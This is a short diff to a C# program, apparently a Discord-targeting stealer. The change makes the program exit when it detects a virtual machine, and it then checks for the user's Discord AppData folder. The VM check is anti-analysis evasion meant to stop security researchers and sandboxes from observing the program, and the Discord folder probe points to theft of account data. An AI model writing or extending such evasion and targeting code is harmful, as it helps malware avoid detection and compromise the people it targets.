@@ -33,7 +33,10 @@ namespace Furious
 		{
 			if (checkForVM)
 			{
-				CheckForVM();
+				if (CheckForVM())
+                {
+					Environment.Exit(0);
+                }
 			}
 			if (Directory.Exists("C:\\Users\\" + Environment.UserName + "\\AppData\\Roaming\\discord"))
 			{
